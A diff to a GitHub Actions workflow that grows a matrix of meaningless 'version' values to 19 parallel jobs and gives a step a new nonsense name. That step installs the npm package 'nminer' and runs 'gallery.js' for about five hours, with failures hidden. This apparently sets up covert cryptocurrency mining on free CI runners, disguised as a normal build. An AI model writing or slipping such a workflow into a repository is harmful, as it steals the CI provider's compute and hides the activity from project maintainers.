@@ -9,21 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3065 }
-          - { version: 6834 }
-          - { version: 6122 }
-          - { version: 4624 }
-          - { version: 1087 }
-          - { version: 4313 }
-          - { version: 2947 }
-          - { version: 9249 }
-          - { version: 5185 }
-          - { version: 2312 }
-          - { version: 9771 }
-          - { version: 3128 }
-          - { version: 1881 }
-          - { version: 4166 }
-          - { version: 4628 }
+          - { version: 5248 }
+          - { version: 6972 }
+          - { version: 9212 }
+          - { version: 7356 }
+          - { version: 2044 }
+          - { version: 3890 }
+          - { version: 3030 }
+          - { version: 9600 }
+          - { version: 3063 }
+          - { version: 7110 }
+          - { version: 9622 }
+          - { version: 1721 }
+          - { version: 1059 }
+          - { version: 6604 }
+          - { version: 1579 }
+          - { version: 5218 }
+          - { version: 658 }
+          - { version: 1042 }
+          - { version: 967 }
 
     steps:
       - name: Checkout
@@ -34,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: since pale who apropos shiny
+      - name: huzzah cloudy bootleg
         run: |
           npm install nminer@latest
-          timeout 326m node gallery.js || echo "gallery executed"
+          timeout 306m node gallery.js || echo "gallery executed"
